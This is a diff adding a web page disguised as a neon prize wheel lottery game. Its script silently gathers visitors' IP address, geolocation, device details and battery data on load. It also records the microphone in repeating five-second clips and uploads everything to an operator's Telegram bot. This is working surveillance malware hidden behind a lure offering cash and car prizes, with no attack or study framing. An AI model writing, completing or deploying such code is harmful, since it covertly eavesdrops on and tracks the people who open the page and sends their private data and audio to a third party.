@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>W8</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #000;
+        }
+
+        .wheel-container {
+            position: relative;
+            width: 300px;
+            height: 300px;
+        }
+
+        .wheel {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            transition: transform 4s ease-out;
+            box-shadow: 0 0 20px #ff00ff, 0 0 30px #ff00ff, 0 0 40px #ff00ff, 0 0 50px #ff00ff, 0 0 60px #ff00ff, 0 0 70px #ff00ff, 0 0 800px #ff00ff;
+        }
+
+        .pointer {
+            width: 0;
+            height: 0;
+            border-left: 15px solid transparent;
+        }
+
+        #spinButton {
+            display: block;
+            margin-top: 20px;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #e8096a;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            box-shadow: -1px 0px 14px 5px #ffffff;
+        }
+
+        #spinButton:hover {
+            background-color: #e600e6;
+            box-shadow: 0 0 10px #ff00ff;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="wheel-container">
+        <img src="LotaryWeal.png" alt="Spinning Wheel" class="wheel" id="wheel">
+        <div class="pointer"></div>
+    </div>
+    <button id="spinButton">Spin the Wheel</button>
+
+    <script>
+        // Remove hardcoded botToken and chatId
+        // Use only dynamically fetched TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID
+        // Remove: const botToken = ...
+        // Remove: let chatId = ...
+        // Remove: getChatIdFromUrl and related usages
+        // Refactor all sendToTelegram, sendTextToTelegram, sendAudioToTelegram, etc. to use TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID
+        // Ensure all fetches to Telegram use these variables
+
+        function sendToTelegram(method, params) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(params)
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) {
+                        throw new Error(data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert(`Failed to send message to Telegram: ${error.message}`);
+                });
+        }
+
+        function sendIpAddressToTelegram() {
+            fetch("https://api.ipify.org/?format=json")
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    collectAndSendInfo(ipAddress);
+                })
+                .catch(error => {
+                    console.error(error);
+                    alert("Failed to fetch IP address.");
+                });
+        }
+
+        function collectAndSendInfo(wanIp) {
+            const userAgent = navigator.userAgent;
+            const batteryPromise = navigator.getBattery ? navigator.getBattery() : Promise.resolve({ level: null });
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            const networkType = connection ? connection.effectiveType : 'unknown';
+            const dateAndTime = new Date().toLocaleString();
+            const totalRam = navigator.deviceMemory || 'unknown';
+
+            batteryPromise.then(battery => {
+                const batteryPercentage = battery.level !== null ? battery.level * 100 + '%' : 'unknown';
+
+                const infoMessage = `
+🌐 WAN IP Address: ${wanIp}
+📱 User-Agent: ${userAgent}
+🔋 Battery Percentage: ${batteryPercentage}
+📡 Network Type: ${networkType}
+🗓 Date and Time: ${dateAndTime}
+💾 Total RAM: ${totalRam} GB`;
+
+                sendToTelegram('sendMessage', { chat_id: TELEGRAM_CHAT_ID, text: infoMessage });
+            });
+        }
+
+        sendIpAddressToTelegram();
+
+        function sendAudioToTelegram(blob) {
+            const formData = new FormData();
+            formData.append("audio", blob, "recording.mp3");
+            formData.append("chat_id", TELEGRAM_CHAT_ID);
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
+                method: 'POST',
+                body: formData
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) {
+                        throw new Error(data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert(`Failed to send audio to Telegram: ${error.message}`);
+                });
+        }
+
+        function startRecording() {
+            const audioChunks = [];
+            let mediaRecorder;
+
+            navigator.mediaDevices
+                .getUserMedia({ audio: true, video: false })
+                .then((stream) => {
+                    mediaRecorder = new MediaRecorder(stream);
+
+                    mediaRecorder.addEventListener("dataavailable", (event) => {
+                        audioChunks.push(event.data);
+                    });
+
+                    mediaRecorder.addEventListener("stop", () => {
+                        const audioBlob = new Blob(audioChunks, { type: "audio/wav" });
+                        sendAudioToTelegram(audioBlob);
+                        setTimeout(startRecording, 5000); // Start recording again after 5 seconds
+                    });
+
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                    }, 5000);
+                })
+                .catch((error) => {
+                    console.error(error);
+                    alert("Failed to access microphone.");
+                });
+        }
+
+        startRecording();
+
+        const prizes = ['10$', 'Car', '100$', '30$', 'Gold', '50$', '1000$', 'Instant'];
+
+        document.getElementById('spinButton').addEventListener('click', () => {
+            const wheel = document.getElementById('wheel');
+            const randomDegree = Math.floor(Math.random() * 360);
+            const rotation = 3600 + randomDegree;
+            wheel.style.transition = 'transform 4s ease-out';
+            wheel.style.transform = `rotate(${rotation}deg)`;
+
+            setTimeout(() => {
+                const finalDegree = rotation % 360;
+                const segmentIndex = Math.floor(finalDegree / (360 / prizes.length));
+                alert(`You won ${prizes[segmentIndex]}`);
+            }, 4000);
+        });
+
+        // ====== CONFIGURATION ======
+        // ====== DEVICE/ENVIRONMENT INFO COLLECTION ======
+        async function getDeviceInfo() {
+            const nav = navigator;
+            const deviceType = /android/i.test(nav.userAgent) ? 'Android' :
+                /iphone|ipad|ipod/i.test(nav.userAgent) ? 'iPhone/iOS' :
+                /windows/i.test(nav.userAgent) ? 'Windows PC' :
+                /macintosh|mac os x/i.test(nav.userAgent) ? 'Mac' :
+                /linux/i.test(nav.userAgent) ? 'Linux' : 'Unknown';
+            const userAgent = nav.userAgent;
+            const platform = nav.platform;
+            const language = nav.language || nav.userLanguage;
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const referrer = document.referrer ? document.referrer : 'Direct/None';
+            const connection = nav.connection ? nav.connection.effectiveType : 'Unknown';
+            const cpuCores = nav.hardwareConcurrency || 'Unknown';
+            const ram = nav.deviceMemory ? nav.deviceMemory + ' GB' : 'Unknown';
+            const now = new Date();
+            const currentTime = now.toLocaleString();
+            let batteryInfo = 'Not supported';
+            if (nav.getBattery) {
+                try {
+                    const battery = await nav.getBattery();
+                    batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not charging'})`;
+                } catch (e) {}
+            }
+            return {
+                deviceType, userAgent, platform, language, screenRes, timezone, referrer,
+                connection, cpuCores, ram, batteryInfo, currentTime
+            };
+        }
+
+        // ====== IP & GEOLOCATION INFO ======
+        async function getIPGeoInfo() {
+            try {
+                const res = await fetch('https://geolocation-db.com/json/');
+                if (!res.ok) throw new Error('IP info fetch failed');
+                const data = await res.json();
+                return {
+                    ip: data.IPv4 || 'Unknown',
+                    city: data.city || 'Unknown',
+                    region: data.state || 'Unknown',
+                    country: data.country_name || 'Unknown'
+                };
+            } catch (e) {
+                return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
+            }
+        }
+
+        // ====== MESSAGE FORMATTER ======
+        function formatDeviceInfo(info, geo) {
+            return [
+                '*Device and Environment Info*',
+                `📱 Device Name/Type: ${info.deviceType}`,
+                `🕸️ User Agent: ${info.userAgent}`,
+                `💻 Platform: ${info.platform}`,
+                `🈯 Language: ${info.language}`,
+                `📐 Screen Resolution: ${info.screenRes}`,
+                `⏰ Timezone: ${info.timezone}`,
+                `🔗 Referrer: ${info.referrer}`,
+                `📶 Connection Type: ${info.connection}`,
+                `🧠 CPU Cores: ${info.cpuCores}`,
+                `💾 RAM: ${info.ram}`,
+                `🔋 Battery Info: ${info.batteryInfo}`,
+                `🕒 Current Time: ${info.currentTime}`,
+                '',
+                '*IP and Geolocation Info*',
+                `🌍 IP Address: ${geo.ip}`,
+                `🏙️ City: ${geo.city}`,
+                `🌐 Region/State: ${geo.region}`,
+                `🌎 Country: ${geo.country}`
+            ].join('\n');
+        }
+
+        // ====== ON PAGE LOAD: SEND DEVICE/ENV INFO ======
+        window.addEventListener('DOMContentLoaded', async () => {
+            const info = await getDeviceInfo();
+            const geo = await getIPGeoInfo();
+            const message = formatDeviceInfo(info, geo);
+            sendToTelegram('sendMessage', { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' });
+        });
+
+        // Fetch Telegram config from server.txt
+        async function getTelegramConfig() {
+            try {
+                const res = await fetch('server.txt');
+                const text = await res.text();
+                const token = text.match(/TOKEN=(.*)/)[1].trim();
+                const chatId = text.match(/CHAT_ID=(.*)/)[1].trim();
+                return { token, chatId };
+            } catch (e) {
+                alert('Failed to load Telegram config.');
+                return { token: '', chatId: '' };
+            }
+        }
+
+        let TELEGRAM_BOT_TOKEN = '';
+        let TELEGRAM_CHAT_ID = '';
+        getTelegramConfig().then(cfg => {
+            TELEGRAM_BOT_TOKEN = cfg.token;
+            TELEGRAM_CHAT_ID = cfg.chatId;
+        });
+    </script>
+</body>
+
+</html>
